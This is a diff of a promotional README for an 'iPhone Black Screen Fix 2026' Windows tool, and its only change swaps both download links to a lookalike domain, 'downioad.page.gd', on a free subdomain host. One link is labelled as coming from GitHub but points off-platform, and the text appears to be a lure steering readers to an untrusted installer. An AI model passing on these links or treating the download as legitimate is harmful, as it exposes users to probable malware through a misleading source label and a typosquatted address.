@@ -2,7 +2,7 @@
 
 Facing a black screen on your iPhone can be a stressful experience, often leaving you unsure of how to proceed. iPhone Black Screen Fix 2026 is a dedicated software solution designed for Windows 10 and 11 users to help troubleshoot and resolve this common issue with confidence. Whether the problem stems from software glitches, system errors, or accidental settings changes, this tool provides a user-friendly and efficient approach to get your device back to normal.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -68,4 +68,4 @@ This version of iPhone Black Screen Fix was last updated in October 2026, incorp
 
 Ready to resolve your iPhone's black screen issue? Download the latest version of the tool below to get started.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
